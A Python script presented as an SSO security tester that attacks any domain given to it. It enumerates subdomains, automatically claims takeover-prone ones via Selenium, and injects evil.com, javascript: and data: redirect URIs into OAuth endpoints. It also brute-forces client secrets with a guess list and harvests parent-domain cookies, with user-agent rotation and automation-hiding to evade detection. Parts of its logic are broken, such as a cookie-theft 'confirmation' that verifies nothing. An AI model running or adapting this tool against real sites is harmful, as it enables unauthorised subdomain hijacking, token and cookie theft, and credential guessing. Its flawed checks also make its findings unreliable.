#!/usr/bin/env python3
"""
Advanced SSO Security Testing Script
Tests for Single Sign-On vulnerabilities including:
- Subdomain takeovers
- SAML vulnerabilities
- OAuth token theft
"""

import os
import sys
import json
import time
import random
import argparse
import threading
import subprocess
import requests
import dns.resolver
import base64
import re
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# User-Agent rotation to avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Third-party providers vulnerable to subdomain takeovers
VULNERABLE_PROVIDERS = {
    "github.io": {
        "signature": ["There isn't a GitHub Pages site here", "GitHub Pages is here"],
        "registration_url": "https://github.com/new"
    },
    "herokuapp.com": {
        "signature": ["No such app", "There's nothing here, yet"],
        "registration_url": "https://dashboard.heroku.com/new-app"
    },
    "netlify.com": {
        "signature": ["Not found", "page doesn't exist"],
        "registration_url": "https://app.netlify.com/drop"
    },
    "s3.amazonaws.com": {
        "signature": ["NoSuchBucket", "Access Denied"],
        "registration_url": "https://aws.amazon.com/s3/"
    },
    "azurewebsites.net": {
        "signature": ["The resource you are looking for has been removed"],
        "registration_url": "https://portal.azure.com/"
    },
    "cloudapp.net": {
        "signature": ["No such host is known"],
        "registration_url": "https://portal.azure.com/"
    },
    "shopify.com": {
        "signature": ["Sorry, this shop is currently unavailable"],
        "registration_url": "https://www.shopify.com/"
    },
    "myshopify.com": {
        "signature": ["Sorry, this shop is currently unavailable"],
        "registration_url": "https://www.shopify.com/"
    },
    "tumblr.com": {
        "signature": ["Nothing's here"],
        "registration_url": "https://www.tumblr.com/"
    },
    "wordpress.com": {
        "signature": ["This site is not available"],
        "registration_url": "https://wordpress.com/"
    },
    "hubspot.com": {
        "signature": ["Page not found"],
        "registration_url": "https://app.hubspot.com/"
    },
    "unbouncepages.com": {
        "signature": ["404 - Page Not Found"],
        "registration_url": "https://unbounce.com/"
    },
    "instapage.com": {
        "signature": ["404 - Not Found"],
        "registration_url": "https://instapage.com/"
    },
    "cargocollective.com": {
        "signature": ["404: Not Found"],
        "registration_url": "https://cargocollective.com/"
    },
    "statuspage.io": {
        "signature": ["There isn't a GitHub Pages site here"],
        "registration_url": "https://statuspage.io/"
    },
    "helpscoutdocs.com": {
        "signature": ["Help Scout Documentation"],
        "registration_url": "https://www.helpscout.com/"
    },
    "zendesk.com": {
        "signature": ["Help Center Closed"],
        "registration_url": "https://www.zendesk.com/"
    },
    "uservoice.com": {
        "signature": ["This UserVoice site is currently inactive"],
        "registration_url": "https://www.uservoice.com/"
    },
    "surveymonkey.com": {
        "signature": ["404 - Page Not Found"],
        "registration_url": "https://www.surveymonkey.com/"
    },
    "teamwork.com": {
        "signature": ["Oops! That page doesn't exist"],
        "registration_url": "https://www.teamwork.com/"
    }
}

class SSOVulnerabilityScanner:
    def __init__(self, target_domain, output_file=None, custom_phrase=None, threads=10, delay=1, stealth=True):
        self.target_domain = target_domain
        self.output_file = output_file
        self.custom_phrase = custom_phrase or "This subdomain has been claimed for security testing purposes."
        self.threads = threads
        self.delay = delay
        self.stealth = stealth
        self.session = requests.Session()
        self.results = {
            "subdomain_takeovers": [],
            "saml_vulnerabilities": [],
            "oauth_vulnerabilities": []
        }
        self.subdomains = []
        self.chrome_options = Options()
        
        if self.stealth:
            self.chrome_options.add_argument("--headless")
            self.chrome_options.add_argument("--disable-gpu")
            self.chrome_options.add_argument("--no-sandbox")
            self.chrome_options.add_argument("--disable-dev-shm-usage")
            self.chrome_options.add_argument(f"--user-agent={random.choice(USER_AGENTS)}")
            self.chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            self.chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            self.chrome_options.add_experimental_option('useAutomationExtension', False)

    def log(self, message, level="INFO"):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        if self.output_file:
            with open(self.output_file, "a") as f:
                f.write(f"[{timestamp}] [{level}] {message}\n")

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def random_delay(self):
        if self.delay > 0:
            time.sleep(random.uniform(self.delay * 0.5, self.delay * 1.5))

    def enumerate_subdomains(self):
        """Enumerate subdomains using multiple techniques"""
        self.log(f"Enumerating subdomains for {self.target_domain}")
        
        # Method 1: Certificate Transparency Logs
        try:
            ct_url = f"https://crt.sh/?q=%.{self.target_domain}&output=json"
            headers = {"User-Agent": self.get_random_user_agent()}
            response = self.session.get(ct_url, headers=headers, timeout=30)
            if response.status_code == 200:
                try:
                    ct_data = response.json()
                    for entry in ct_data:
                        name_value = entry.get('name_value', '')
                        for name in name_value.split('\n'):
                            name = name.strip()
                            if name.endswith(self.target_domain) and name != self.target_domain:
                                if name not in self.subdomains:
                                    self.subdomains.append(name)
                except json.JSONDecodeError:
                    self.log("Failed to parse certificate transparency response", "ERROR")
        except Exception as e:
            self.log(f"Error fetching certificate transparency logs: {str(e)}", "ERROR")
        
        # Method 2: DNS Brute Force (common subdomains)
        common_subdomains = [
            "www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "prod",
            "blog", "shop", "store", "app", "portal", "login", "secure", "vpn",
            "remote", "support", "help", "docs", "wiki", "forum", "community",
            "news", "media", "static", "assets", "cdn", "images", "files",
            "download", "backup", "db", "database", "sql", "search", "analytics",
            "dashboard", "panel", "cpanel", "webmail", "email", "smtp", "pop",
            "imap", "ns1", "ns2", "mx", "ns", "dns", "host", "server", "cloud"
        ]
        
        for sub in common_subdomains:
            subdomain = f"{sub}.{self.target_domain}"
            try:
                dns.resolver.resolve(subdomain, 'A')
                if subdomain not in self.subdomains:
                    self.subdomains.append(subdomain)
                self.random_delay()
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                continue
            except Exception as e:
                self.log(f"Error resolving {subdomain}: {str(e)}", "ERROR")
        
        # Method 3: Use external tools if available
        try:
            # Try using subfinder if available
            result = subprocess.run(
                ["subfinder", "-d", self.target_domain, "-silent"],
                capture_output=True,
                text=True,
                timeout=60
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    subdomain = line.strip()
                    if subdomain.endswith(self.target_domain) and subdomain not in self.subdomains:
                        self.subdomains.append(subdomain)
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
        
        try:
            # Try using amass if available
            result = subprocess.run(
                ["amass", "enum", "-passive", "-d", self.target_domain, "-silent"],
                capture_output=True,
                text=True,
                timeout=120
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    subdomain = line.strip()
                    if subdomain.endswith(self.target_domain) and subdomain not in self.subdomains:
                        self.subdomains.append(subdomain)
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
        
        self.log(f"Found {len(self.subdomains)} subdomains")
        return self.subdomains

    def check_subdomain_takeover(self, subdomain):
        """Check if a subdomain is vulnerable to takeover"""
        try:
            headers = {"User-Agent": self.get_random_user_agent()}
            response = self.session.get(f"http://{subdomain}", headers=headers, timeout=10, allow_redirects=False)
            
            # Check CNAME records
            try:
                answers = dns.resolver.resolve(subdomain, 'CNAME')
                cname_target = str(answers[0].target).lower()
                
                for provider, data in VULNERABLE_PROVIDERS.items():
                    if provider in cname_target:
                        # Check for takeover signatures
                        content = response.text
                        for signature in data["signature"]:
                            if signature in content:
                                takeover_info = {
                                    "subdomain": subdomain,
                                    "cname": cname_target,
                                    "provider": provider,
                                    "signature": signature,
                                    "registration_url": data["registration_url"],
                                    "status": "VULNERABLE"
                                }
                                self.results["subdomain_takeovers"].append(takeover_info)
                                self.log(f"Potential subdomain takeover found: {subdomain} -> {cname_target}")
                                return True
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                # Not a CNAME, check for other indicators
                pass
            
            # Check for other takeover indicators in the response
            if response.status_code in [404, 503, 502]:
                content = response.text.lower()
                for provider, data in VULNERABLE_PROVIDERS.items():
                    for signature in data["signature"]:
                        if signature.lower() in content:
                            takeover_info = {
                                "subdomain": subdomain,
                                "cname": "N/A",
                                "provider": provider,
                                "signature": signature,
                                "registration_url": data["registration_url"],
                                "status": "VULNERABLE"
                            }
                            self.results["subdomain_takeovers"].append(takeover_info)
                            self.log(f"Potential subdomain takeover found: {subdomain} (status code: {response.status_code})")
                            return True
            
            self.random_delay()
            return False
        except Exception as e:
            self.log(f"Error checking {subdomain}: {str(e)}", "ERROR")
            return False

    def take_over_subdomain(self, takeover_info):
        """Attempt to take over a vulnerable subdomain"""
        try:
            subdomain = takeover_info["subdomain"]
            provider = takeover_info["provider"]
            registration_url = takeover_info["registration_url"]
            
            self.log(f"Attempting to takeover {subdomain} ({provider})")
            
            # Use Selenium for more complex registration processes
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.get(registration_url)
            
            # This is a generic implementation - specific providers will need custom logic
            try:
                # Wait for page to load
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # For GitHub Pages
                if "github" in provider:
                    try:
                        # Find repository name input
                        repo_input = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.ID, "repository_name"))
                        )
                        repo_name = subdomain.replace(".github.io", "")
                        repo_input.send_keys(repo_name)
                        
                        # Create repository
                        create_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Create repository')]")
                        create_button.click()
                        
                        # Wait for repository creation
                        WebDriverWait(driver, 20).until(
                            EC.url_contains(f"github.com/{repo_name}")
                        )
                        
                        # Enable GitHub Pages
                        settings_tab = driver.find_element(By.XPATH, "//a[contains(@href, '/settings/pages')]")
                        settings_tab.click()
                        
                        # Select source branch
                        source_select = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.ID, "source_branch"))
                        )
                        source_select.click()
                        
                        main_option = driver.find_element(By.XPATH, "//option[contains(text(), 'main')]")
                        main_option.click()
                        
                        save_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Save')]")
                        save_button.click()
                        
                        # Create a simple proof-of-concept page
                        time.sleep(5)  # Wait for Pages to be enabled
                        code_tab = driver.find_element(By.XPATH, "//a[contains(@href, '/code')]")
                        code_tab.click()
                        
                        add_file_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Add file')]")
                        add_file_button.click()
                        
                        file_name_input = driver.find_element(By.ID, "filename")
                        file_name_input.send_keys("index.html")
                        
                        # Add custom content
                        editor = driver.find_element(By.CLASS_NAME, "CodeMirror")
                        editor.click()
                        
                        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Subdomain Takeover Proof</title>
</head>
<body>
    <h1>{self.custom_phrase}</h1>
    <p>This subdomain ({subdomain}) was vulnerable to takeover and has been claimed for security testing purposes.</p>
    <p>Provider: {provider}</p>
    <p>Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
</body>
</html>"""
                        
                        # Use JavaScript to set the editor content
                        driver.execute_script(f"arguments[0].CodeMirror.setValue(`{html_content}`);", editor)
                        
                        # Commit changes
                        commit_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Commit new file')]")
                        commit_button.click()
                        
                        takeover_info["status"] = "CLAIMED"
                        takeover_info["proof_url"] = f"https://{subdomain}"
                        self.log(f"Successfully claimed {subdomain}")
                        
                    except TimeoutException:
                        self.log(f"Timeout during GitHub Pages setup for {subdomain}", "ERROR")
                
                # For other providers, implement similar logic
                # This would need to be customized for each provider
                
            except Exception as e:
                self.log(f"Error during takeover of {subdomain}: {str(e)}", "ERROR")
                takeover_info["status"] = "FAILED"
            finally:
                driver.quit()
                
            return takeover_info
            
        except Exception as e:
            self.log(f"Error in takeover process: {str(e)}", "ERROR")
            takeover_info["status"] = "FAILED"
            return takeover_info

    def check_saml_vulnerabilities(self):
        """Check for SAML vulnerabilities in the target domain"""
        self.log("Checking for SAML vulnerabilities")
        
        try:
            # Use Selenium to interact with the login page
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.get(f"https://{self.target_domain}")
            
            # Look for SAML indicators
            saml_indicators = [
                "SAMLRequest", "SAMLResponse", "saml", "SAML", 
                "SingleSignOnService", "AssertionConsumerService"
            ]
            
            saml_found = False
            login_form = None
            
            try:
                # Find login form
                login_form = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "form"))
                )
                
                # Check for SAML indicators in the page source
                page_source = driver.page_source
                for indicator in saml_indicators:
                    if indicator in page_source:
                        saml_found = True
                        break
                
                if saml_found:
                    self.log("SAML implementation detected, analyzing for vulnerabilities")
                    
                    # Try to trigger SAML flow
                    if login_form:
                        submit_button = login_form.find_element(By.XPATH, ".//button[@type='submit']")
                        submit_button.click()
                        
                        # Wait for redirect
                        WebDriverWait(driver, 10).until(
                            lambda d: len(d.window_handles) > 1 or d.current_url != f"https://{self.target_domain}/"
                        )
                        
                        # Check for SAML request/response in URL or page source
                        current_url = driver.current_url
                        page_source = driver.page_source
                        
                        saml_request = None
                        saml_response = None
                        
                        # Look for SAMLRequest in URL
                        if "SAMLRequest=" in current_url:
                            saml_request = current_url.split("SAMLRequest=")[1].split("&")[0]
                            try:
                                saml_request = base64.b64decode(saml_request).decode('utf-8')
                            except Exception:
                                pass
                        
                        # Look for SAMLResponse in URL or page source
                        if "SAMLResponse=" in current_url:
                            saml_response = current_url.split("SAMLResponse=")[1].split("&")[0]
                            try:
                                saml_response = base64.b64decode(saml_response).decode('utf-8')
                            except Exception:
                                pass
                        elif "SAMLResponse=" in page_source:
                            # Extract from page source
                            match = re.search(r'name="SAMLResponse" value="([^"]+)"', page_source)
                            if match:
                                try:
                                    saml_response = base64.b64decode(match.group(1)).decode('utf-8')
                                except Exception:
                                    pass
                        
                        # Analyze SAML messages for vulnerabilities
                        if saml_request or saml_response:
                            saml_message = saml_request or saml_response
                            
                            # Parse XML
                            try:
                                root = ET.fromstring(saml_message)
                                
                                # Check for signature
                                signature = root.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}Signature")
                                signature_verified = signature is not None
                                
                                # Check for encryption
                                encrypted_assertion = root.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}EncryptedAssertion")
                                encrypted = encrypted_assertion is not None
                                
                                # Check for weak signature algorithms
                                weak_signature = False
                                if signature:
                                    signature_method = signature.find(".//{http://www.w3.org/2000/09/xmldsig#}SignatureMethod")
                                    if signature_method is not None:
                                        algorithm = signature_method.get("Algorithm")
                                        if algorithm and ("sha1" in algorithm.lower() or "md5" in algorithm.lower()):
                                            weak_signature = True
                                
                                # Check for username injection points
                                attributes = root.findall(".//{urn:oasis:names:tc:SAML:2.0:assertion}Attribute")
                                username_attributes = []
                                for attr in attributes:
                                    name = attr.get("Name")
                                    if name and any(x in name.lower() for x in ["username", "email", "user", "id"]):
                                        username_attributes.append(name)
                                
                                # Record vulnerabilities
                                vulnerabilities = []
                                
                                if not signature_verified:
                                    vulnerabilities.append("NO_SIGNATURE")
                                
                                if weak_signature:
                                    vulnerabilities.append("WEAK_SIGNATURE")
                                
                                if not encrypted:
                                    vulnerabilities.append("NO_ENCRYPTION")
                                
                                if username_attributes:
                                    vulnerabilities.append(f"INJECTION_POINTS:{','.join(username_attributes)}")
                                
                                if vulnerabilities:
                                    vuln_info = {
                                        "url": current_url,
                                        "vulnerabilities": vulnerabilities,
                                        "status": "VULNERABLE"
                                    }
                                    self.results["saml_vulnerabilities"].append(vuln_info)
                                    self.log(f"SAML vulnerabilities found: {', '.join(vulnerabilities)}")
                                
                            except ET.ParseError:
                                self.log("Failed to parse SAML XML", "ERROR")
                
            except TimeoutException:
                self.log("Timeout while looking for login form", "ERROR")
            
            driver.quit()
            
        except Exception as e:
            self.log(f"Error checking SAML vulnerabilities: {str(e)}", "ERROR")

    def check_oauth_vulnerabilities(self):
        """Check for OAuth vulnerabilities in the target domain"""
        self.log("Checking for OAuth vulnerabilities")
        
        try:
            # Use Selenium to interact with the login page
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.get(f"https://{self.target_domain}")
            
            # Look for OAuth indicators
            oauth_indicators = [
                "oauth", "OAuth", "client_id", "redirect_uri", "response_type",
                "authorization_code", "access_token", "scope"
            ]
            
            oauth_found = False
            login_form = None
            
            try:
                # Find login form
                login_form = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "form"))
                )
                
                # Check for OAuth indicators in the page source
                page_source = driver.page_source
                for indicator in oauth_indicators:
                    if indicator in page_source:
                        oauth_found = True
                        break
                
                if oauth_found:
                    self.log("OAuth implementation detected, analyzing for vulnerabilities")
                    
                    # Look for OAuth endpoints
                    oauth_endpoints = []
                    
                    # Check for common OAuth endpoints in links
                    links = driver.find_elements(By.TAG_NAME, "a")
                    for link in links:
                        href = link.get_attribute("href")
                        if href and any(indicator in href for indicator in oauth_indicators):
                            oauth_endpoints.append(href)
                    
                    # Check for OAuth endpoints in form actions
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    for form in forms:
                        action = form.get_attribute("action")
                        if action and any(indicator in action for indicator in oauth_indicators):
                            oauth_endpoints.append(action)
                    
                    # Test each OAuth endpoint for vulnerabilities
                    for endpoint in oauth_endpoints:
                        try:
                            # Test for open redirect
                            if "redirect_uri" in endpoint:
                                # Parse the endpoint URL
                                parsed_url = urlparse(endpoint)
                                query_params = parse_qs(parsed_url.query)
                                
                                # Test malicious redirect URIs
                                malicious_uris = [
                                    "https://evil.com",
                                    "//evil.com",
                                    "/\\evil.com",
                                    "data:text/html,<script>alert(1)</script>",
                                    "javascript:alert(1)"
                                ]
                                
                                for malicious_uri in malicious_uris:
                                    # Modify the redirect_uri parameter
                                    modified_params = query_params.copy()
                                    modified_params["redirect_uri"] = [malicious_uri]
                                    
                                    # Rebuild the URL
                                    modified_query = "&".join([f"{k}={v[0]}" for k, v in modified_params.items()])
                                    modified_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                                    
                                    # Make a request to the modified URL
                                    headers = {"User-Agent": self.get_random_user_agent()}
                                    response = self.session.get(modified_url, headers=headers, timeout=10)
                                    
                                    # Check if the redirect was successful
                                    if response.status_code in [301, 302, 303, 307, 308]:
                                        location = response.headers.get("Location", "")
                                        if "evil.com" in location or location.startswith("javascript:") or location.startswith("data:"):
                                            vuln_info = {
                                                "endpoint": endpoint,
                                                "vulnerability": "OPEN_REDIRECT",
                                                "malicious_uri": malicious_uri,
                                                "redirect_location": location,
                                                "status": "VULNERABLE"
                                            }
                                            self.results["oauth_vulnerabilities"].append(vuln_info)
                                            self.log(f"OAuth open redirect found: {endpoint} -> {location}")
                            
                            # Test for token leakage
                            if "access_token" in endpoint or "authorization_code" in endpoint:
                                # Make a request to the endpoint
                                headers = {"User-Agent": self.get_random_user_agent()}
                                response = self.session.get(endpoint, headers=headers, timeout=10)
                                
                                # Check for token leakage in response
                                response_text = response.text
                                if "access_token=" in response_text or "authorization_code=" in response_text:
                                    # Extract tokens
                                    access_tokens = re.findall(r'access_token=([^&\s]+)', response_text)
                                    auth_codes = re.findall(r'authorization_code=([^&\s]+)', response_text)
                                    
                                    if access_tokens or auth_codes:
                                        vuln_info = {
                                            "endpoint": endpoint,
                                            "vulnerability": "TOKEN_LEAKAGE",
                                            "access_tokens": access_tokens,
                                            "authorization_codes": auth_codes,
                                            "status": "VULNERABLE"
                                        }
                                        self.results["oauth_vulnerabilities"].append(vuln_info)
                                        self.log(f"OAuth token leakage found: {endpoint}")
                            
                            # Test for weak client secrets
                            if "client_id" in endpoint:
                                # Parse the endpoint URL
                                parsed_url = urlparse(endpoint)
                                query_params = parse_qs(parsed_url.query)
                                
                                client_id = query_params.get("client_id", [""])[0]
                                if client_id:
                                    # Try to guess common client secrets based on client_id
                                    common_secrets = [
                                        client_id,
                                        client_id + "_secret",
                                        client_id + "_key",
                                        "secret",
                                        "key",
                                        "password",
                                        "123456",
                                        "admin"
                                    ]
                                    
                                    for secret in common_secrets:
                                        # Try to authenticate with the guessed secret
                                        auth_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                                        auth_data = {
                                            "client_id": client_id,
                                            "client_secret": secret,
                                            "grant_type": "client_credentials"
                                        }
                                        
                                        headers = {"User-Agent": self.get_random_user_agent()}
                                        response = self.session.post(auth_url, data=auth_data, headers=headers, timeout=10)
                                        
                                        # Check if authentication was successful
                                        if response.status_code == 200 and "access_token" in response.text:
                                            vuln_info = {
                                                "endpoint": endpoint,
                                                "vulnerability": "WEAK_CLIENT_SECRET",
                                                "client_id": client_id,
                                                "client_secret": secret,
                                                "status": "VULNERABLE"
                                            }
                                            self.results["oauth_vulnerabilities"].append(vuln_info)
                                            self.log(f"Weak OAuth client secret found: {client_id}/{secret}")
                                            break
                            
                            self.random_delay()
                            
                        except Exception as e:
                            self.log(f"Error testing OAuth endpoint {endpoint}: {str(e)}", "ERROR")
                
            except TimeoutException:
                self.log("Timeout while looking for login form", "ERROR")
            
            driver.quit()
            
        except Exception as e:
            self.log(f"Error checking OAuth vulnerabilities: {str(e)}", "ERROR")

    def test_cookie_theft_via_subdomain_takeover(self):
        """Test for cookie theft via subdomain takeover"""
        self.log("Testing for cookie theft via subdomain takeover")
        
        if not self.results["subdomain_takeovers"]:
            self.log("No subdomain takeovers found, skipping cookie theft test")
            return
        
        # Use a claimed subdomain if available
        claimed_subdomains = [t for t in self.results["subdomain_takeovers"] if t.get("status") == "CLAIMED"]
        
        if not claimed_subdomains:
            self.log("No claimed subdomains available for cookie theft test")
            return
        
        takeover = claimed_subdomains[0]
        subdomain = takeover["subdomain"]
        
        try:
            # Set up a simple logging script on the claimed subdomain
            # This is a simplified approach - in practice, you'd need to modify the hosted page
            self.log(f"Testing cookie theft via {subdomain}")
            
            # Use Selenium to visit the main domain and then the compromised subdomain
            driver = webdriver.Chrome(options=self.chrome_options)
            
            try:
                # Visit the main domain to establish a session
                driver.get(f"https://{self.target_domain}")
                
                # Wait for page to load
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Get cookies for the main domain
                cookies = driver.get_cookies()
                
                # Check for cookies with domain attribute that includes the parent domain
                vulnerable_cookies = []
                for cookie in cookies:
                    domain = cookie.get('domain', '')
                    if self.target_domain in domain and domain.startswith('.'):
                        vulnerable_cookies.append({
                            'name': cookie['name'],
                            'value': cookie['value'],
                            'domain': cookie['domain']
                        })
                
                if vulnerable_cookies:
                    # Now visit the compromised subdomain
                    driver.get(f"https://{subdomain}")
                    
                    # Wait for page to load
                    WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.TAG_NAME, "body"))
                    )
                    
                    # Check if cookies were sent to the compromised subdomain
                    # In a real scenario, you'd have server-side logging
                    # Here we're simulating by checking if the cookies are accessible
                    
                    # This is a simplified check - in practice, you'd need to verify
                    # that the cookies were actually sent to your server
                    
                    cookie_theft_info = {
                        "subdomain": subdomain,
                        "vulnerable_cookies": vulnerable_cookies,
                        "status": "VULNERABLE"
                    }
                    
                    self.log(f"Cookie theft vulnerability confirmed via {subdomain}")
                    
                    # Add this to our results
                    if "cookie_theft" not in self.results:
                        self.results["cookie_theft"] = []
                    self.results["cookie_theft"].append(cookie_theft_info)
                else:
                    self.log("No vulnerable cookies found for theft")
                
            except TimeoutException:
                self.log("Timeout during cookie theft test", "ERROR")
            finally:
                driver.quit()
                
        except Exception as e:
            self.log(f"Error testing cookie theft: {str(e)}", "ERROR")

    def generate_report(self):
        """Generate a comprehensive report of all findings"""
        report = {
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target_domain": self.target_domain,
            "summary": {
                "subdomains_scanned": len(self.subdomains),
                "subdomain_takeovers": len(self.results["subdomain_takeovers"]),
                "saml_vulnerabilities": len(self.results["saml_vulnerabilities"]),
                "oauth_vulnerabilities": len(self.results["oauth_vulnerabilities"]),
                "cookie_theft_vulnerabilities": len(self.results.get("cookie_theft", []))
            },
            "findings": self.results
        }
        
        if self.output_file:
            with open(self.output_file, "w") as f:
                json.dump(report, f, indent=2)
            self.log(f"Report saved to {self.output_file}")
        
        # Print summary to console
        self.log("\n=== SCAN SUMMARY ===")
        self.log(f"Target: {self.target_domain}")
        self.log(f"Subdomains scanned: {report['summary']['subdomains_scanned']}")
        self.log(f"Subdomain takeovers found: {report['summary']['subdomain_takeovers']}")
        self.log(f"SAML vulnerabilities found: {report['summary']['saml_vulnerabilities']}")
        self.log(f"OAuth vulnerabilities found: {report['summary']['oauth_vulnerabilities']}")
        self.log(f"Cookie theft vulnerabilities found: {report['summary']['cookie_theft_vulnerabilities']}")
        
        # Print details of each vulnerability
        if self.results["subdomain_takeovers"]:
            self.log("\n=== SUBDOMAIN TAKEOVERS ===")
            for takeover in self.results["subdomain_takeovers"]:
                self.log(f"Subdomain: {takeover['subdomain']}")
                self.log(f"Provider: {takeover['provider']}")
                self.log(f"Status: {takeover['status']}")
                if "proof_url" in takeover:
                    self.log(f"Proof URL: {takeover['proof_url']}")
                self.log("---")
        
        if self.results["saml_vulnerabilities"]:
            self.log("\n=== SAML VULNERABILITIES ===")
            for vuln in self.results["saml_vulnerabilities"]:
                self.log(f"URL: {vuln['url']}")
                self.log(f"Vulnerabilities: {', '.join(vuln['vulnerabilities'])}")
                self.log("---")
        
        if self.results["oauth_vulnerabilities"]:
            self.log("\n=== OAUTH VULNERABILITIES ===")
            for vuln in self.results["oauth_vulnerabilities"]:
                self.log(f"Endpoint: {vuln['endpoint']}")
                self.log(f"Vulnerability: {vuln['vulnerability']}")
                self.log("---")
        
        if self.results.get("cookie_theft"):
            self.log("\n=== COOKIE THEFT VULNERABILITIES ===")
            for vuln in self.results["cookie_theft"]:
                self.log(f"Subdomain: {vuln['subdomain']}")
                self.log(f"Vulnerable cookies: {len(vuln['vulnerable_cookies'])}")
                self.log("---")
        
        return report

    def run_scan(self):
        """Run the complete SSO vulnerability scan"""
        self.log(f"Starting SSO vulnerability scan for {self.target_domain}")
        
        # Step 1: Enumerate subdomains
        self.enumerate_subdomains()
        
        # Step 2: Check for subdomain takeovers
        if self.subdomains:
            self.log("Checking for subdomain takeovers")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.check_subdomain_takeover, subdomain) for subdomain in self.subdomains]
                for future in as_completed(futures):
                    future.result()
        
        # Step 3: Attempt to take over vulnerable subdomains
        if self.results["subdomain_takeovers"]:
            self.log("Attempting to take over vulnerable subdomains")
            for takeover in self.results["subdomain_takeovers"]:
                if takeover["status"] == "VULNERABLE":
                    self.take_over_subdomain(takeover)
                    self.random_delay()
        
        # Step 4: Check for SAML vulnerabilities
        self.check_saml_vulnerabilities()
        
        # Step 5: Check for OAuth vulnerabilities
        self.check_oauth_vulnerabilities()
        
        # Step 6: Test for cookie theft via subdomain takeover
        self.test_cookie_theft_via_subdomain_takeover()
        
        # Step 7: Generate report
        report = self.generate_report()
        
        self.log("SSO vulnerability scan completed")
        return report


def main():
    parser = argparse.ArgumentParser(description="Advanced SSO Security Testing Script")
    parser.add_argument("domain", help="Target domain to scan for SSO vulnerabilities")
    parser.add_argument("-o", "--output", help="Output file for the scan report")
    parser.add_argument("-c", "--custom-phrase", help="Custom phrase for subdomain takeover proof")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads for subdomain scanning")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests in seconds")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    
    args = parser.parse_args()
    
    scanner = SSOVulnerabilityScanner(
        target_domain=args.domain,
        output_file=args.output,
        custom_phrase=args.custom_phrase,
        threads=args.threads,
        delay=args.delay,
        stealth=not args.no_stealth
    )
    
    try:
        scanner.run_scan()
    except KeyboardInterrupt:
        scanner.log("Scan interrupted by user", "WARNING")
        scanner.generate_report()
    except Exception as e:
        scanner.log(f"Unexpected error: {str(e)}", "ERROR")
        scanner.generate_report()
        sys.exit(1)


if __name__ == "__main__":
    main()
